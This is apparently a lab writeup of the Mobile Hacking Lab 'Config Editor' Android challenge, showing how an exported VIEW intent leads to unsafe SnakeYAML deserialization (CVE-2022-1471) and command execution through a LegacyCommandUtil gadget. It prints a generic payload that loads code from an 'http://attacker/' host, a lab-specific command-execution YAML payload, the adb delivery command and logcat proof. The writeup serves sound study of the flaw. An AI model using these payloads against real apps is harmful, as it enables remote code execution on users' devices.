![Cover](cover-mobile-hacking-config.png)
# Config Editor - Android RCE Writeup

*Ref: [Config Edittor - Mobile Hacking Lab](https://www.mobilehackinglab.com/course/lab-config-editor-rce)*
## Overview
This lab can be solved by chaining an exported `VIEW` entry point with unsafe SnakeYAML deserialization.

At a high level, the application accepts an external YAML resource, downloads it, and then parses it with `SnakeYAML` using a permissive default constructor. Because the APK also contains a dangerous local gadget class, attacker-controlled YAML can be turned into direct command execution.

This writeup explains how CVE-2022-1471 leads us to the exact root cause in this application, how the data flows through the app, and why the lab-specific payload is much simpler than the generic `ScriptEngineManager` payload often shown in public writeups.

## Starting From CVE-2022-1471
CVE-2022-1471 is the canonical SnakeYAML unsafe deserialization issue. The key lesson from that CVE is not a single magic payload, but a dangerous design pattern:

- untrusted YAML reaches `Yaml.load(...)`
- SnakeYAML accepts attacker-controlled Java type tags
- the parser instantiates Java classes during deserialization
- a reachable class on the classpath has dangerous side effects
- object creation becomes code execution

So when auditing this APK, the right question is not "Does it use the exact public CVE payload?" but:

- Does the app parse attacker-controlled YAML?
- Does it use unsafe SnakeYAML construction?
- Is there any suitable gadget on the app classpath?

In this lab, the answer to all three is yes.

## Attack Surface Recon
### Exported entry point
`MainActivity` is exported and accepts `VIEW` intents for YAML from `file`, `http`, and `https` sources:

![alt text](image-8.png)

This already gives the attacker a delivery surface.

### Remote fetch path
The app converts the incoming `Uri` into a `URL` and downloads it. For remote resources it uses `HttpURLConnection`:

![alt text](image-9.png)
![alt text](image-10.png)
The app also permits cleartext traffic:

![alt text](image-11.png)

That makes emulator testing straightforward via `http://10.0.2.2:8686/...` *(My devices host)*.

## Root Cause
The root cause is unsafe deserialization of attacker-controlled YAML.

In `MainActivity.loadYaml()`, the app creates SnakeYAML with `new Yaml(dumperOptions)` and immediately calls `yaml.load(inputStream)` on external input:
![alt text](image-12.png)

The important detail is that `Yaml(DumperOptions)` does **not** create a safe parser. In this source tree it still creates a default SnakeYAML `Constructor`:

![alt text](image-13.png)

So the vulnerable pattern is:

```java
Yaml yaml = new Yaml(dumperOptions);
Object deserializedData = yaml.load(inputStream);
```

## Why SnakeYAML Is Dangerous Here
### Tag-controlled class resolution
SnakeYAML allows YAML tags to represent Java class names.

When deserializing a tagged object, it resolves the class from the tag and loads it with `Class.forName(...)`:

![alt text](image-14.png)
![alt text](image-15.png)

SnakeYAML tags use the `tag:yaml.org,2002:` namespace internally:

![alt text](image-16.png)
![alt text](image-17.png)

### Scalar-node constructor invocation
A scalar node is a YAML value with no nested structure, such as a string, number, or boolean.

SnakeYAML models this as `ScalarNode` with `NodeId.scalar`:

![alt text](image-18.png)
![alt text](image-19.png)
![alt text](image-20.png)

For tagged scalar nodes, SnakeYAML uses `ConstructScalar` and looks for a one-argument constructor:
![alt text](image-21.png)
![alt text](image-22.png)

This is a perfect match for the gadget in the APK.

## The Lab-Specific Gadget
The APK contains a local gadget class:
![alt text](image-23.png)
Its constructor is:

```java
public LegacyCommandUtil(String command) throws IOException {
    Runtime.getRuntime().exec(command);
}
```

This means a tagged scalar YAML object can directly map to:

```text
LegacyCommandUtil(String command)
-> Runtime.exec(command)
```

That is why the lab-specific exploit is much simpler than the generic public CVE payloads.

## End-to-End Data Flow
The full flow in this lab is:

```text
Attacker-controlled URL
-> VIEW intent
-> MainActivity.handleIntent()
-> CopyUtil.copyFileFromUri()
-> HttpURLConnection downloads YAML
-> MainActivity.loadYaml()
-> SnakeYAML Yaml.load()
-> resolve explicit Java tag
-> instantiate LegacyCommandUtil(String)
-> Runtime.exec()
-> RCE
```

Step by step:

1. `MainActivity.onCreate()` calls `handleIntent()`.
![alt text](image-25.png)

2. `handleIntent()` reads the incoming `VIEW` intent and passes the URI to `CopyUtil.copyFileFromUri(data)`.
![alt text](image-26.png)

3. `CopyUtil` downloads the YAML and stores it locally.
![alt text](image-27.png)
![alt text](image-28.png)

4. The observer calls `loadYaml(uri)` on the downloaded file. 

5. `loadYaml()` calls `yaml.load(inputStream)` and deserialization begins.
![alt text](image-29.png)

1. SnakeYAML resolves the explicit Java tag and instantiates the gadget.
![alt text](image-30.png)
![alt text](image-31.png)
2. The gadget constructor executes the supplied command.
![alt text](image-32.png)

## Why The Generic ScriptEngineManager Payload Is Not Needed Here
Public CVE-2022-1471 writeups often use payloads such as:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker/"]
  ]]
]
```

That payload is a generic JDK gadget chain. It relies on class loading and service/provider discovery behavior.

This lab is easier because the APK itself already contains a direct gadget:

```text
YAML tag -> LegacyCommandUtil(String) -> exec()
```

No indirect JDK gadget is necessary.

## Payload Design For This Lab
### Parse-check payload
A harmless YAML payload can be used to verify the download and parse path:
`payload-check.yml`
```yml
name: test
value: 123
items:
  - one
  - two
meta:
  source: local-host-8686
  purpose: verify-download-and-parse
```

### Command-execution payload
The simplest confirmed payload was a log-based proof:

`payload-rce-log.yml`
```yml
!!com.mobilehackinglab.configeditor.LegacyCommandUtil "/system/bin/log -t RCE_POC reached"
```


This form is preferable for the lab because:

- it uses the actual app-local gadget
- it avoids shell metacharacters and redirection
- it fits `Runtime.exec(String)` cleanly
- it leaves a file artifact that can be checked on-device

## Practical Validation
The exploitation path was validated in two stages.

### Stage 1: Delivery and parsing
`payload-check.yml` was loaded through the remote `VIEW` path and displayed correctly in the UI. That confirmed:

- the `VIEW` intent route works
- the emulator can reach the host via `10.0.2.2:8686`
- the app downloads the file successfully
- `loadYaml()` and `yaml.load()` are reached

### Stage 2: Command execution
A gadget payload using `LegacyCommandUtil` was then loaded and produced the following log evidence:
```commandLine
adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://10.0.2.2:8686/payload-rce.yml" -t "application/yaml"
```
Check `adb logcat`:
```commandLine
04-17 13:36:07.373   566  1803 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=http://10.0.2.2:8686/... typ=application/yaml flg=0x10000000 cmp=com.mobilehackinglab.configeditor/.MainActivity} from uid 0
04-17 13:36:07.385   566  1482 W ActivityTaskManager: Tried to set launchTime (0) < mLastActivityLaunchTime (16823541)
04-17 13:36:07.473   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f3438000 0x3f3e1c000]
04-17 13:36:07.483   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f73ec000 0x3f7dd0000]
04-17 13:36:07.490   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f54d9000 0x3f5ebd000]
04-17 13:36:07.543   566   592 I ActivityTaskManager: Displayed com.mobilehackinglab.configeditor/.MainActivity: +169ms
04-17 13:36:07.562  8655  8674 D EGL_emulation: app_time_stats: avg=3253.92ms min=1.78ms max=35050.13ms count=11
04-17 13:36:07.580  1344  1344 I GoogleInputMethodService: GoogleInputMethodService.onFinishInput():3420 
04-17 13:36:07.581  1344  1344 I GoogleInputMethodService: GoogleInputMethodService.onStartInput():2002 
04-17 13:36:07.582  1344  1344 I DeviceUnlockedTag: DeviceUnlockedTag.notifyDeviceLockStatusChanged():31 Notify device unlocked.
04-17 13:36:07.984   566  1803 D AutofillSession: Set the response has expired.
04-17 13:36:08.399  8960  8960 I RCE_POC : reached
```
![alt text](image-33.png)

That confirms:

- SnakeYAML accepted the explicit Java tag
- the tagged scalar node was mapped into `LegacyCommandUtil(String)`
- `Runtime.getRuntime().exec(...)` was reached successfully

## Conclusion
The root cause of the lab is unsafe SnakeYAML deserialization of attacker-controlled YAML.

The exploitation path is straightforward because the APK contains an ideal local gadget. The attacker only needs to deliver a tagged scalar YAML object to `yaml.load(...)`, and SnakeYAML does the rest:

```text
Untrusted YAML
-> explicit Java tag
-> class resolution
-> constructor invocation
-> Runtime.exec()
```

The most important takeaway is that the dangerous part is not merely loading YAML from an external source. The real issue is allowing untrusted YAML to control Java type resolution during deserialization.
